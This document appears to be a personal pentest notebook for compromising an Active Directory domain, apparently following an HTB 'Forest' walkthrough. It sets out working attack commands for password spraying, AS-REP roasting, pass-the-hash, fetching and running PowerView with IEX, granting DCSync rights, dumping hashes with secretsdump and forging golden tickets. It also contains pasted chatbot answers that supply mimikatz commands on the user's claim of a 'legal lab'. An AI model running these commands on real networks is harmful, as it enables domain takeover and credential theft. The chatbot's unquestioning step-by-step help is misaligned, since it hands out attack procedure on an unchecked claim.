
# enum

- nmap -sC -sV -oA nmap/forest 10.10.10.1 -v 
- sleep 300; nmap -p-  -oA nmap/forest-allports -v 10.10.10.1

## smb port 455
- smbclient -L 10.10.10.1 (check shares) smb anony no shares


## dns port 53
try dns to leak it's hostname
- nslookup 10.10.10.1


if you ping the host and it's ttl is 127 it's a window if it's 64 it's linux

## Ldapsearch
- `ldapsearch -H  ldap://10.10.10.1 -x -s base namingcontext` (we giving -s base namingconetxt if we don't now the DC name if this did not help run nmap it can show DC name)
- `ldapsearch -H ldap://10.10.10.1 -x -b "DC=htb,DC=local" '(objectClass=)'  'sAMAccountName' | grep sAMAccountName`
- (give us users too on domain)
- note users to file.txt
- check commands and explation of active directory on https://ippsec.rocks

## RPC
- `rpcclient -U "" -N 10.10.10.1  `(no user or password let us in)
- enumdomusers (give us all users)
- sometimes it gives you users that ldap did not give you
- you can find what group a user is in using it's rid
- `queryusergroups <rid>`
- it gives you a rid of the group he is in you can take  the rid and see the group name
- `querygroup <rid>`
- `queryuser <rid>` (pass last set , must change password)
- 

check when users are created , when is password last set(all this info is important when we do password spraying )


## crackmapexec
before we do bruteforece we have to check we don't lock an account out
do
- `crackmapexec smb 10.10.10.1 --pass-pol`
- try enum4linux to now like password policy if it has lockout enum4linux is old try 
==add alternative of enum4linux here== 

try to do null authentication attack
- `crackmapexec smb 10.10.10.1 --pass-pol -u ' ' -p ' '`
- old domains allow anonymous login that's why enum4linux works 
- in fresh install of window 2016 you need to have credentails null auth does not work
- if you see it working note in report that null auth allows domain enumaration and you can get a bunch of information 

now we have users try to brute force
create password list yourself or use rockyou.txt
- `crackmapexec smb 10.10.1.0/24 -u userst.txt -h /usr/share/wordlists/rockyou.txt`


## impacket-GetNPUsers (AS-REP Roasting)
used for users that does not require kerberos preauthentication
like a service account or try bulling down a hash of one of the users
- `impacket-GetNPUsers -dc-ip 10.10.10.1 -request 'htb.local/'`
- if you wanna crack it in hashcat change the format to hashcat in the same command 
- `impacket-GetNPUsers -dc-ip 10.10.10.1 -request 'htb.local/' -format hashcat`
- crack it on machine that has much cpu
- to look id you gonna use to crack it you can find like this take the name start of hash 
- `hashcat --example-hashes | grep -i krb` (krb is name started on the hash find num if it's 23 or etc)

## hashcat
try cracking the hash in hashcat 
- hashcat hash.txt rockyou.txt
- now that we have the password 


## crackmapexec
- `crackmapexec smb 10.10.10.1 -u saacid -p password --shares` (finding shares that user can read and write to)

## decrypting password out of group policy

?

## evil-winrm 
we gonna login to that user
- `evil-winrm -u saacid -i 10.10.10.1 `
- it gonna ask password enter then you are in that user machine 
- or `evil-winrm -u saacid -p password -i 10.10.10.1`
- you can do post enumariton of active directory


## enum after you have a shell run winPeas
now to send the file of winpeas.exe in kali to machine you have shell of evil-winrm is many ways
on kali run 
- ` impacket-smbserver please $(pwd) -smb2support -u ippsec -password supportMe
- This shares your current directory over SMB at `\\ATTACKER_IP\myshare`.
- With `net use`:
- `net use \\ATTACKER_IP\please /u:ippsec supportMe cd \\ATTACKER_IP\myshare .\winPEAS.exe`
-  in order to do getNewPSdrive  we have to put the password into cred object 
- `$pass = convertto-securestring 'supportMe' -AsPlainText -Force` 
- `$cred New-Object System.Management.Automation.PSCredentail('ippsec', $pass)`
- `New-PSDrive -Name ippsec -PSProvider FileSystem -Credentail -Root \\10.10.10.14\please` ip is the  kali machine the attacker  , and the last \please is the share
- Think of it like this:
---
- **Attacker’s Kali** → is the **file server**.
    - With `impacket-smbserver`, you’re basically saying:
        > “Hey, I’m hosting an SMB share at `\\ATTACKER_IP\share_name`. Here are the files inside my folder.”
- **Victim’s shell (evil-winrm, RDP, etc.)** → is the **client**.
    - From inside that shell, you connect to your Kali’s SMB share (using either `net use` or `New-PSDrive`).
    - Once connected, the victim can browse and run files stored on your Kali as if they were local.
- the attacker is **creating a temporary SMB “network drive” on Kali**, and the victim shell is simply connecting to it, so you don’t have to upload files manually.
---
- and when he runned this above on shell , his kali that he runned impacket-smbserver got hash of user like successful so he can go to drive now 
- and he says when can go into ippsec drive and then run winpeas
- `cd :ippsec:`
- `./winpeas.exe`
- now he was  in a shell now he is  in drive called ipssec
- and then he opened new terminal to connect to another shell using evil-winrm 
- and when he got a shell he runned this again this three commands to access the file in his smb
- `$pass = convertto-securestring 'supportMe' -AsPlainText -Force`
- `$cred New-Object System.Management.Automation.PSCredentail('ippsec', $pass)`
- `New-PSDrive -Name ippsec2 -PSProvider FileSystem -Credentail -Root 
- and he named this ippsec2 ?

- ## 💡 Why mount a drive if you just want to run `winPEAS.exe`?

Good question. Honestly:
- If `net use` works → it’s quicker.
- If it doesn’t (or you want to avoid storing plain-text creds in command history) → `New-PSDrive` is cleaner and more PowerShell-native.
- In some **red team / CTF scenarios**, they show you `New-PSDrive` because it’s a bit more advanced and stealthier than `net use`
- So both do the _same job_: **get files from your Kali SMB share into the Windows victim**.  
  The difference is just **command style**:
- `net use` = old-school, quick.
- `New-PSDrive` = PowerShell-native, with credential objects, more stealth
- ## Key Differences

| Feature      | `net use` (Method 1)       | `New-PSDrive` (Method 2)                               |
| ------------ | -------------------------- | ------------------------------------------------------ |
| Tool         | Classic Windows command    | PowerShell cmdlet                                      |
| Access style | Maps directly via UNC path | Creates a PowerShell “drive” (like a virtual drive)    |
| Credentials  | Inline (`/u:user pass`)    | Secure object (`ConvertTo-SecureString`, `New-Object`) |
| Use case     | Quick and simple           | More stealthy, flexible, scriptable                    |
| End result   | Access `\\attacker\share`  | Access `share:` like a local drive                     |


## bloodhound
- run `.\sharphound.exe -c all`on shell on victam
- run `neo4j console` set a password for bloodhound
- run bloodhound on kali
- `bloodhound --no-sandbox`
- if you find you can add a user to a group 
- in your shell you can add it
- `net user ippsec passw$rd /add /domain  `(adding user to domain)
- to add to group you finded like "exchange windows permission"
- `net group "Exchange Windows Permissions` (check users in that group)
- `net group "Exchange Windows Permission" /add ippsec`

## Powerview (DCSYNCE ATTACK)
i found out that exhange windows has permission to abuse the writeDACL to a domain object, and i can grant myself the DCSYnc privilege 
- adding domainobjectAcl the right of DCSynce
- we use  powerview
- before it was https://github.com/PowerShellEmpire/PowerTools it deprecated and now it's in      https://github.com/PowerShellMafia/powerSploit
- clone the repo in your kali , then cd to recon and you can find powerview there 
- setup python server in kali
- run this command in shell
- `powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.10.1/powerview.ps1")` downloading into the drive on shell we have
- then he runned the command this command
- `$pass = convertto-securestring 'passw$rd' -AsPlainText -force`
- `$cred = New-Object System.Management.Automation.PSCredential('HTB\ippsec, $pass`)

```
-### Why is this needed before `Add-DomainObjectAcl`?
Because the command:
`Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync`
- Needs to **authenticate as your new user** (`HTB\ippsec`).
    
- Without `-Credential`, PowerView would just run as your current session’s user (which might not have the right privileges yet).
  - By explicitly giving it `$cred`, you’re saying:
    > “Use my new domain user (`ippsec` with passw$rd) to make this change.”
The only difference:
- Before, you used `$cred` to authenticate against **SMB share**.
- Now, you use `$cred` to authenticate against **Active Directory object permissions**.
  
So don’t confuse the two:
- It’s not about the SMB drive anymore.
- It’s about telling PowerView: “Use this specific domain account I just created and gave rights to.”
```

- inside ippsec is the name of user he added to Exchange Windows Permission group
- he copeid this from bloodhoud bottom
- `Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync`

- try installing the dev poweview if it does not work
- git clone <> -b dev
- and now we can 
- ### What this means in plain words
- The **Domain object** = the “crown jewel” of Active Directory (represents the whole AD domain).
- The **DACL** = list of “who can do what” (permissions).
- **Exchange Windows Permissions group** can change those rules.
- You added your new user (`ippsec`) into that group.
- With `Add-DomainObjectAcl`, you are saying:  
- “Give my user (`ippsec`) the right to request replication (DCSync) from the Domain Controller.”
So now, your low-level user can **act like a Domain Controller** and ask for **password hashes of any account in the domain (even krbtgt / Domain Admin)**.



## secretdump.py try to dump hashes
- `secretdump.py htb.local/ippsec/passw$rd@10.10.10.1`
- if i does not work run this bellow again on shell 
-  `$pass = convertto-securestring 'passw$rd' -AsPlainText -force`
- `$cred = New-Object System.Management.Automation.PSCredential('HTB\ippsec, $pass`)
- - if you try to dump hashes in secretdumps and it does not work run the commands try to get a shell again login the user and pass of evil-winrm then run 2 commands above and and run also this command below
- `Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -PrincipalIdentity ippsec -Rights DCSync` and then try like this and run your secretdump if it did not work again run this 
- `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ippsec -Rights DCSync`
- and try if secretdump works
- and we have all hashes to all the accounts 
- save it to file 


## crackmapexec 
try auth to adminsistaory and his hash
- `crackmapexec smb 10.10.10.1 -u administartor -h <hash>`
- crackmapexec does not like if you are in directory called smb and you running this comamnd
- and if you see he has been pwned 
- try to pssex

## psexec
- `pssexec -hashes <hash> administrator@10.10.10.1`
- now we are administartor


## try to crack the hashes using hashcat if you want



## GOLDEN Ticket (KERB)
- Normally do it in mimikatz
- and try to do it from linux 
- you can go to cheat-sheet in https://gist.github.com/TarlogicSecurity
- try using a ticket with in linux
- go to golden ticket
- copy the krbtgt you found in secretdumps  and it's the signing key window uses to sign tickets copy the hashes at end of `:here not what before it  :::`
- we also need domain-sid
- go to shell we have say `Get-ADDomain htb.local` and copy the sid and hash into note.txt
- `python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>` username field you can put new user and this user in inside many groups he is like administaror
  - Set the ticket for impacket use we adding the file ticket we created of user and we puting him in the enviroment variable 
- `export KRB5CCNAME=<TGS_ccache_file>
- then use pssex
- `python psexec.py htb.local/<user_name>@<remote_hostname> -k -no-pass`
- and sometimes it says time is off so we need to sink the time 
- if you got clock time error / clock skew too great
- mitigation is install = sudo apt install ntpdate ,sudo ntpdate 10.10.10.1
- and run again psexec
- he struggled alot and even got error saying server not found in kerberos database
- and the end impacket wanted the dns name of the machine 
- `python psexec.py htb.local/<user_name>@<remote_hostname> -k -no-pass`
- in remote hostname field add the dns name instead of the ip 
- when you login using psxec if you say whoami it gonna show you are system 
- if you login using wmiexec you gonna be administrator
- 







---


on my lab legal pentest lab i get a shell on active dirctory after i got username and password and then i got run on it bloodhound and i saw attack path like the user is in group called service account that service account is member of privileged it account that is member of account operators that is member of exchange windows permission it's dc machine so in exchange windows permission group i can create a user and add to that group and i did then i found it that group i added a user i click to it in bloudhound info was the the group have permision to modify DACL on the domain with the write access to the target objects DACL , you can grant yourself any privilege ypu want on the object and when i go to abuse tab in bloudhound i got this " to abuse the writeDACL to a domain object you can grant yourself the DCSYnc privilege ? so what is going on what i'm doing  i heard the terms DCSYNC attack before is this the attck ? and i heard you can use powersploit ? so tell me eveyrthing it's on my lab no illegal thing for educational purposes
### **1️⃣ What you’re seeing in BloodHound**

From what you described:
1. Your user is part of a **service account group**.
2. That group is nested in **Privileged IT Accounts** → **Account Operators** → **Exchange Windows Permissions**.
3. The **Exchange Windows Permissions** group has **WriteDACL** (Modify Permissions) on **Domain** objects.
This is a classic **privilege escalation path** in Active Directory (AD). BloodHound identifies **effective permissions** that you can abuse.
### **2️⃣ Understanding WriteDACL**
- **DACL = Discretionary Access Control List**  
    It defines **who can do what** to an object in AD (users, groups, permissions).
- **WriteDACL permission**: allows you to **change the ACL of an object**.
    - On a **user object**, you can give yourself or other accounts any permission.
    - On the **domain object**, this is **extremely powerful**: it lets you assign yourself **high-level privileges**, including **DCSync** rights.
So when BloodHound says:
> “to abuse the WriteDACL to a domain object you can grant yourself the DCSYNC privilege”
…it’s telling you that you can modify ACLs to grant your account the **DCSync privileges**, which are enough to extract password hashes from the domain.
### **3️⃣ What is DCSync?**
- **DCSync attack**: abusing AD permissions to **impersonate a Domain Controller** and **ask another DC for account password data**.
- This is part of the **Mimikatz / PowerShell attack chain**.
Essentially
- You don’t need a Domain Controller shell.
- With **DCSync**, you can retrieve:
    - **NTLM hashes** of any user, including `krbtgt` (used to forge TGTs in Kerberos attacks).
- This is **equivalent to full domain compromise**, since with these hashes you can forge Kerberos tickets and access almost anything.
### **4️⃣ Powersploit / Mimikatz usage**
Yes — in labs you can simulate this with:
1. **PowerView / PowerShell Empire / PowerSploit**
    - PowerView can enumerate permissions.
    - PowerSploit has `Invoke-DCSync` via `Invoke-Mimikatz`.
2. **Mimikatz DCSync command:**
    ```powershell
    mimikatz # lsadump::dcsync /domain:LAB.LOCAL /user:Administrator
    ```
    This asks a DC for the password hash of the user.
    - If you granted yourself `DS-Replication-Get-Changes` (aka DCSync rights), it works.

### **5️⃣ Your lab scenario**
So what you’re doing is
1. You compromise a low-privileged user.
2. You follow BloodHound paths → nested groups → Exchange Windows Permissions.
3. That group has **WriteDACL** on the domain.
4. You create a user and **grant it DCSync privileges** (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All).
5. Your new user can now **dump hashes** of domain accounts (like `krbtgt`) → full AD compromise.

✅ This is **exactly the DCSync attack scenario**.
### **6️⃣ Educational note**
- DCSync doesn’t exploit a vulnerability; it **abuses misconfigured permissions**.
- Any lab or company with **over-permissioned groups** is vulnerable.
- BloodHound is great at **mapping these paths**.
### **7️⃣ Recommended steps in your lab**

1. Use BloodHound to **confirm all paths** to WriteDACL and DCSync.
2. Grant your lab user **DS-Replication-Get-Changes** on the domain object.
3. Use Mimikatz / PowerSploit to run `Invoke-DCSync` and dump hashes.
4. Verify hashes by using `kerberoasting` or `pass-the-hash` in lab.
---
💡 **Summary diagram of your attack path:**

```
YourUser
  └─ ServiceAccount
      └─ Privileged IT Accounts
          └─ Account Operators
              └─ Exchange Windows Permissions
                  └─ WriteDACL on Domain
                        └─ Grant DCSync to Yourself
                              └─ Dump Domain Hashes (Mimikatz)
```

---


Perfect 👍 this is where everything ties together — you’ve got **DCSync → hashes (including krbtgt)**, and now you’re looking at the **Golden Ticket attack**. Let me break it all down step by step, no fluff.

---

## 🧩 1. What is a Golden Ticket?

- In Active Directory, users authenticate with **Kerberos tickets**.
    
- A **Golden Ticket** is a forged **TGT (Ticket Granting Ticket)** signed with the **krbtgt account’s NTLM hash**.
    
- Since Domain Controllers trust any ticket signed by `krbtgt`, this forged ticket is basically a _master key_ → it lets you impersonate **any user, with any privilege, for as long as you want**.
    

It’s called “golden” because once you have it, you own the whole domain.

---

## 🧩 2. What is the krbtgt account?

- `krbtgt` is a special built-in account in AD.
    
- Its hash is used by the Key Distribution Center (KDC) to **sign and validate Kerberos tickets**.
    
- If you know the `krbtgt` hash, you can sign your own tickets → the DC thinks they’re legit.
    

That’s why during DCSync, attackers specifically want to dump the **krbtgt hash**.

---

## 🧩 3. What is a SID?

- **SID = Security Identifier**.
    
- It’s like a unique ID number for every user, group, or object in AD.
    
- Example:
    
    - A user `Administrator` might have a SID like:
        
        ```
        S-1-5-21-123456789-234567890-345678901-500
        ```
        
        - The long middle part (`123456789-234567890-345678901`) = **domain identifier**.
            
        - The last part (`500`) = the RID (relative identifier). For Administrator, it’s always 500.
            

So when you forge a Golden Ticket, you need:

- The **domain SID** (so the ticket is tied to your AD).
    
- The **RID** of the user you want to impersonate (like 500 for Administrator).
    

---

## 🧩 4. Why are tools looking for “Microsoft well-known SIDs”?

- Some SIDs are always the same across all Windows environments.
    
- Example:
    
    - Administrator = `...-500`
        
    - Domain Admins group = `...-512`
        
    - Enterprise Admins = `...-519`
        
    - krbtgt = `...-502`
        
- Tools (like mimikatz, impacket) check these well-known RIDs to know **which account/group you’re impersonating** when building the ticket.
    

This ensures the ticket grants you the right privileges.

---

## 🧩 5. Steps in the Golden Ticket attack

1. **Get krbtgt hash** (via DCSync).
    
2. **Get domain SID** (you can use `whoami /user` or `wmic useraccount get name,sid` or tools will auto-find it).
    
3. **Forge ticket** with tools like Mimikatz or Impacket:
    
    ```bash
    mimikatz # kerberos::golden /user:Administrator /domain:htb.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:<hash> /id:500
    ```
    
    - `/user` = who you want to impersonate
        
    - `/domain` = your AD domain
        
    - `/sid` = domain SID
        
    - `/krbtgt` = hash you dumped
        
    - `/id:500` = RID for Administrator
        
4. **Inject ticket** into memory (`kerberos::ptt` in mimikatz or `klist` in Linux).
    
5. Use that ticket to authenticate anywhere in the domain (e.g. dump secrets, RDP, psexec).
    

---

## 🧩 6. Why it’s dangerous

- Golden Tickets don’t expire (you can make them valid for 10 years).
    
- Even if passwords are changed, as long as the `krbtgt` hash is the same, your Golden Ticket still works.
    
- The only defense is resetting `krbtgt` twice (because two keys are kept in memory).
    

---

## ⚡ TL;DR

- **SID** = unique identifier of accounts and groups. Needed to forge the ticket correctly.
    
- **krbtgt** hash = “master signing key” for Kerberos tickets.
    
- **Golden Ticket** = forged Kerberos TGT using the krbtgt hash + domain SID → lets you impersonate any user.
    
- Tools check **well-known SIDs** (like `500` for Administrator) so they know exactly which user/group your ticket should represent.
    

---

👉 Do you want me to show you **both versions of making a Golden Ticket** (Mimikatz on Windows vs. Impacket on Kali), so you can see what the commands look like in practice?




---


FB325088
2516

50-C2-E8-53-EF-73

# room danteh